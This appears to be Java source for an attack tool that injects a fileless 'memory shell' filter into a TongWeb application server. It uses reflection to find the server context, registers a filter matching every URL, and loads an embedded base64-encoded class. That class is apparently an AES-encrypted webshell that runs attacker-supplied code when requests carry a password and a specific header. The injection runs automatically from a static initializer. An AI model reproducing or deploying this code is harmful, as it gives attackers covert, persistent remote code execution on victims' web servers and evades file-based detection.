package core.memshell;

import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class TongWebFilterMemShell {
    public static Object STANDARD_CONTEXT;
    public static Object RESPONSE;
    public static Object MEMSHELL_OBJECT;
    static String FilterName = "memshell.TongWebFilterShell";

    public TongWebFilterMemShell() {
        try {
            if (STANDARD_CONTEXT == null) {
                getStandardContext();
            }
            if (STANDARD_CONTEXT != null && !isInjected()) {
                injectMemShellClass();
                injectMemShell();
            }

        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }

    private static synchronized boolean isInjected() {
        try {
            Map map = (Map) getFV(STANDARD_CONTEXT, "filterDefs");
            Set set = map.keySet();
            Iterator it = set.iterator();
            while (it.hasNext()){
                Object o = it.next();
                if (o.toString().contains(FilterName)){
                    return true;
                }
            }

        } catch (Exception e) {
        }
        return false;
    }


    private static synchronized void injectMemShell() {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

        try {
            Class<?> Context = null;
            try {
                Context = classLoader.loadClass("com.tongweb.web.thor.Context"); //
            } catch (Exception e) {
            }

            Filter filter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();
            Class<?> FilterDefClass = null;
            try {
                FilterDefClass = classLoader.loadClass("com.tongweb.web.thor.deploy.FilterDef"); //
            } catch (Exception e) {
            }
            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();
            FilterDefCons.setAccessible(true);
            Object filterDef = FilterDefCons.newInstance();
            invoke(filterDef, "setFilterName", FilterName);
            invoke(filterDef, "setFilterClass", filter.getClass().getName());
            invoke(STANDARD_CONTEXT, "addFilterDef", filterDef);

            Class<?> filterMapClass = null;
            try {
                filterMapClass = classLoader.loadClass("com.tongweb.web.thor.deploy.FilterMap"); //
            } catch (Exception e) {

            }
            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();
            FilterMapCons.setAccessible(true);
            Object FilterMapObj = FilterMapCons.newInstance();
            invoke(FilterMapObj, "addURLPattern", "/*");
            invoke(FilterMapObj, "setFilterName", FilterName);
            invoke(STANDARD_CONTEXT, "addFilterMap", FilterMapObj);

            Class<?> ApplicationFilterConfigClass = classLoader.loadClass("com.tongweb.web.thor.core.ApplicationFilterConfig");
            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);
            ApplicationFilterCons.setAccessible(true);
            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);
            Map filterConfigs = (Map) getFV(STANDARD_CONTEXT, "filterConfigs");
            filterConfigs.put(FilterName, ApplicationfilterObj);

        } catch (Throwable var16) {

        }
    }

    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    private static Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static synchronized void getStandardContext() throws Exception {
        try {
            int flag = 0;
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field f1 = threadGroup.getClass().getDeclaredField("threads");
            f1.setAccessible(true);
            Thread[] threads = (Thread[]) f1.get(threadGroup);

            for (Thread thread : threads) {
                try {
                    char[] chars = (char[]) getFV(thread, "name");
                    String name = new String(chars);
                    if (name.contains("http-nio") && name.contains("Acceptor")) {
                        Object target = getFV(thread, "target");
                        Object this0 = getFV(target, "this$0");
                        Object handler = getFV(this0, "handler");
                        Object global = getFV(handler, "global");
                        Object processors = getFV(global, "processors");
                        Field f7 = processors.getClass().getDeclaredField("size");
                        f7.setAccessible(true);
                        if (!f7.get(processors).toString().equals("0")) {
                            if (flag == 0) {
                                Object[] elementData = (Object[]) getFV(processors, "elementData");
                                Object RequestO = getFV(elementData[0], "req");
                                RESPONSE = RequestO.getClass().getMethod("getResponse", (Class[]) (new Class[0])).invoke(RequestO);
                                Method m2 = RequestO.getClass().getDeclaredMethod("getNote", Integer.TYPE);
                                m2.setAccessible(true);
                                Object v = m2.invoke(RequestO, 1);
                                try {
                                    STANDARD_CONTEXT = getFV(v, "context");
                                } catch (Exception e) {
                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod("getServletContext");
                                    m3.setAccessible(true);
                                    Object AppContextFacade = m3.invoke(v);
                                    Object AppContext = getFV(AppContextFacade, "context");
                                    STANDARD_CONTEXT = getFV(AppContext, "context");
                                }
                                flag = 1;
                            }
                        }
                    }
                } catch (Exception e) {
                }

            }

        } catch (Exception e) {
        }
    }

    public static void injectMemShellClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();
        } catch (Exception var5) {
            try {
                String TongListenerBase64 = "yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTG1lbXNoZWxsL1RvbmdXZWJGaWx0ZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAPEHAQYHAMUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwDcAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwEHAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAEdmFyOQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEIBwEJAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABdUb25nV2ViRmlsdGVyU2hlbGwuamF2YQwAZgBnDABcAF0MAF4AXwEAEDNjNmUwYjhhOWMxNTIyNGEMAGAAYQEABHBBUzMMAGIAYQEAEC9mYXZpY29uZGVtby5pY28MAGMAYQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEKAQsMAQwBDQwAZACBDABkAGEBAAVVVEYtOAwAZQBhDABmAG0MAQ4BDwEAA0FFUwcBBgwBEAERAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBEgETDABmARQMAJIBFQwBFgEXAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBGAwBEAEZDAEaARsMARwBHQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEeARMMAGYBHwwBDAEgDAEhAQ0BABBqYXZhLnV0aWwuQmFzZTY0DAEiASMBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAEkASUBABNbTGphdmEvbGFuZy9PYmplY3Q7BwEmDAEnASgMASkBKgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAErASwBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEFgtUmVxdWVzdGVkLVdpdGgMAS0AgQEADlhNTEhUVFBSZXF1ZXN0DAEuAS8MATABMQwBMgCBDACPAJAMAHQAdQEAEG1lbXNoZWxsLnBheWxvYWQHAQgMATMBNAEAG21lbXNoZWxsL1RvbmdXZWJGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09i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";
                byte[] ListenerClass = base64Decode(TongListenerBase64);
                Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass1.setAccessible(true);
                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);
                MEMSHELL_OBJECT = listenerClass.newInstance();
            } catch (Exception var4) {
            }
        }

    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static {
        new TongWebFilterMemShell();
    }
}
